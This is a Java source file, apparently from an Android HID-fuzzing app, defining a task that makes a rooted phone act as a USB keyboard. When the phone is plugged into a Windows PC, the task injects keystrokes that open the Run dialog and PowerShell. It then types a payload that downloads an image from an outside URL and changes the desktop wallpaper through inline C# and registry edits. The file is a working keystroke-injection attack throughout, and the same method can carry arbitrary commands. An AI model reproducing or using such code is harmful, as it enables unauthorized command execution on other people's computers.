package cf.netdex.hidfuzzer.task;

import android.content.Context;

import cf.netdex.hidfuzzer.hid.HIDR;
import cf.netdex.hidfuzzer.hid.Input;
import eu.chainfire.libsuperuser.Shell;

/**
 * Created by netdex on 1/16/2017.
 */

public class WallpaperTask extends HIDTask {
    public WallpaperTask(Context context) {
        super(context, "Downloads and sets a given wallpaper.");
    }

    @Override
    public void run() {
        Shell.Interactive sh = this.getSU();
        if (sh == null) return;

        final HIDR h = this.getHIDR();

        String file = ask("Wallpaper file?", "https://my.mixtape.moe/dgcnqv.png");
        while (!isCancelled()) {
            publishProgress(RunState.IDLE);
            // poll until /dev/hidg0 is writable
            while (!isCancelled() && h.test() != 0) {
                h.delay(1000);
            }
            if (isCancelled()) break;
            publishProgress(RunState.RUNNING);
            h.delay(1000);

            log("opening run dialog");
            h.press_keys(Input.KB.M.LSUPER.c, Input.KB.K.R.c);

            h.delay(2000);
            log("running powershell");
            h.send_string("powershell\n");

            h.delay(2000);
            log("sending payload");
            h.send_string("(new-object System.Net.WebClient).DownloadFile('" + file + "',\"$Env:Temp\\b.jpg\");\n" +
                    "Add-Type @\"\n" +
                    "using System;using System.Runtime.InteropServices;using Microsoft.Win32;namespa" +
                    "ce W{public class S{ [DllImport(\"user32.dll\")]static extern int SystemParamet" +
                    "ersInfo(int a,int b,string c,int d);public static void SW(string a){SystemParam" +
                    "etersInfo(20,0,a,3);RegistryKey c=Registry.CurrentUser.OpenSubKey(\"Control Pan" +
                    "el\\\\Desktop\",true);c.SetValue(@\"WallpaperStyle\", \"2\");c.SetValue(@\"Tile" +
                    "Wallpaper\", \"0\");c.Close();}}}\n" +
                    "\"@\n" +
                    "[W.S]::SW(\"$Env:Temp\\b.jpg\")\n" +
                    "exit\n");

            publishProgress(RunState.DONE);
            while (!isCancelled() && h.test() == 0) {
                h.delay(1000);
            }
            log("Disconnected");
        }
    }
}
